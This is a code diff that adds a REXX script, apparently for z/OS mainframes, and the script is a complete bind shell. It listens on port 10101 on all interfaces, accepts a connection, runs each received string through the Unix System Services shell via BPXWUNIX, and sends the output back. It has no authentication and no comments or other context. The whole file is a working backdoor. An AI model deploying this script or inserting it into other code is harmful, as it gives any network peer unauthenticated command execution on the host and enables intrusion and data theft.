@@ -1,0 +1,54 @@
+/* REXX */
+p = '10101'
+mf_ip = '0.0.0.0'
+n = "25"x
+r = "$ "
+s = SOCKET('INITIALIZE','DAEMON',2)
+s = SOCKET('SOCKET')
+parse var s socket_rc socketID .
+s = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_REUSEADDR','ON')
+s = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_LINGER','OFF')
+s = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON')
+s = Socket('IOCTL',socketID,'FIONBIO','ON')
+s = Socket('BIND',socketID,'AF_INET' p mf_ip)
+s = Socket('Listen',socketID,2)
+parse var s src .
+clients = ''
+DO FOREVER
+ s = Socket('Select','READ' socketID clients 'WRITE' 'EXCEPTION')
+ parse upper var s 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
+ IF INLIST(socketID,readin) THEN DO
+  s = Socket('Accept',socketID)
+  parse var s src hID .
+  clients = hID
+  s = Socket('Socketsetstatus')
+  parse var s src . status
+  s = Socket('Setsockopt',hID,'SOL_SOCKET','SO_ASCII','ON')
+  s = Socket('Ioctl',hID,'FIONBIO','ON' )
+  s = SOCKET('SEND',hID, "$ ")
+ END
+  if readin = hID THEN DO
+   in = SOCKET('RECV',hID,10000)
+   parse var in s_rc s_data_len s_data_text
+   cmd = DELSTR(s_data_text, s_data_len)
+   CALL BPXWUNIX cmd,,out.,err.
+   text = ''
+   DO i = 1 to err.0
+    text = text||err.i||n
+   END
+   DO i = 1 TO out.0
+    text = text||out.i||n
+   END
+   text = text||r
+   s = SOCKET('SEND',hID, text)
+  END
+ END
+return 0
+/*-------*/
+INLIST: procedure
+ arg sock, socklist
+ DO i = 1 to words(socklist)
+   if words(socklist) = 0 then return 0
+   if sock = word(socklist,i) then return 1
+ end
+ return 0
